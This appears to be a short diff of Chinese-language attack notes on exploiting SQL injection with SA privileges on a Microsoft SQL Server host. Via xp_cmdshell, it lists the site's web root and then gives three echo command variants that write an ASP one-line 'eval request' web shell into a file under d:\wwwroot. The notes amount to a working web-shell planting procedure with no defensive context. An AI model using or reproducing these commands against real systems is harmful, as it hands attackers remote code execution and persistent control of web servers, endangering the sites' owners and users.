@@ -1,0 +1,7 @@
+入点是SA权限.
+xp_cmdshell是存在的.
+找到网站主目录 dir d:\wwwroot
+找到站点的目录后.
+Echo ^<%eval request("#")%>^ >d:\wwwroot\xx\ok.asp
+echo ^<%eval request("#")%^> >d:\wwwroot\xx\ok.asp
+echo "<%eval request("#")%>" >d:\wwwroot\xx\ok.asp
